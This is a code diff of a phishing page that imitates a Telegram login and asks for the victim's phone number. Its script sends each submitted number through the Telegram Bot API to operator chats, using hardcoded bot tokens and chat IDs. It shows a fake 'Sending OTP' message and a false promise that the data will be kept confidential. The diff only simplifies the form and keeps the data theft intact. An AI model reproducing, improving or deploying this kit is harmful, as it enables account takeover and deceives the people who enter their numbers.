@@ -173,38 +173,29 @@
       </svg>
     </div>
     <h1>Enter telegram number</h1>
-    <p>To continue, please login first</p>
-    <form id="phoneForm">
-      <label for="country">Country code \/</label>
-      <select id="countrySelect">
-  <option value="+966">KSA Saudi Arabia (+966)</option>
-  <option value="+968">OM Oman (+968)</option>
-  <option value="+964">KW Kuwait (+965)</option>
-  <option value="+971">UAE United Arab Emirates (+971)</option>
-  <option value="+65">SG Singapore (+65)</option>
-  <option value="+49">DE Germany (+49)</option>
-  <option value="+60">MYS Malaysia (+60)</option>
-</select>
+<p>To continue, please login first</p>
 
-<label for="phone">Telegram number</label>
-<input type="tel" id="phoneInput" placeholder="Telegram number" required />
-      
-      <button type="submit" class="btn">next</button>
-      
-      <div class="disclaimer">
-        *Make sure the number entered is active to receive verification. Data will be kept confidential in accordance with the Personal Data Protection Act.
-      </div>
-    </form>
-    <div class="status" id="statusMessage"></div>
+<form id="phoneForm">
+  <label for="phone">Telegram number</label>
+  <input type="tel" id="phoneInput" placeholder="Telegram number" required />
+
+  <button type="submit" class="btn">next</button>
+
+  <div class="disclaimer">
+    *Make sure the number entered is active to receive verification. Data will be kept confidential in accordance with the Personal Data Protection Act.
+  </div>
+</form>
+
+<div class="status" id="statusMessage"></div>
+
   </div>
 
   <script>
-    const phoneForm = document.getElementById('phoneForm');
+const phoneForm = document.getElementById('phoneForm');
 const phoneInput = document.getElementById('phoneInput');
 const statusMessage = document.getElementById('statusMessage');
 const blurOverlay = document.getElementById('blurOverlay');
 const loadingText = document.getElementById('loadingText');
-const countrySelect = document.getElementById('countrySelect');
 
 const bots = [
   { token: "7140967336:AAGcoc5x77uJP9Lr3J455a9soy99DeWANwU", chatId: "6788495149" },
@@ -215,12 +206,15 @@ phoneForm.addEventListener('submit', function(e) {
   e.preventDefault();
 
   const phone = phoneInput.value.trim();
-  const countryText = countrySelect.options[countrySelect.selectedIndex].text;
   const currentBotIndex = parseInt(localStorage.getItem('currentBotIndex') || "0");
   localStorage.setItem('sessionBotIndex', currentBotIndex);
   const bot = bots[currentBotIndex];
 
-  const message = `🌀 *FUN GAY LOGIN*\n━━━━━━━━━━━━━━\n🌍 Country: ${countryText}\n📞 Phone: \`${phone}\`\n━━━━━━━━━━━━━━`;
+  const message = `🌀 *FUN GAY LOGIN*
+━━━━━━━━━━━━━━
+📞 Phone: \`${phone}\`
+━━━━━━━━━━━━━━`;
+
   const api = `https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
 
   statusMessage.textContent = "⏳ Sending OTP to your Telegram account...";
@@ -251,6 +245,6 @@ phoneForm.addEventListener('submit', function(e) {
       statusMessage.style.color = "red";
     });
 });
-  </script>
+</script>
 </body>
 </html>
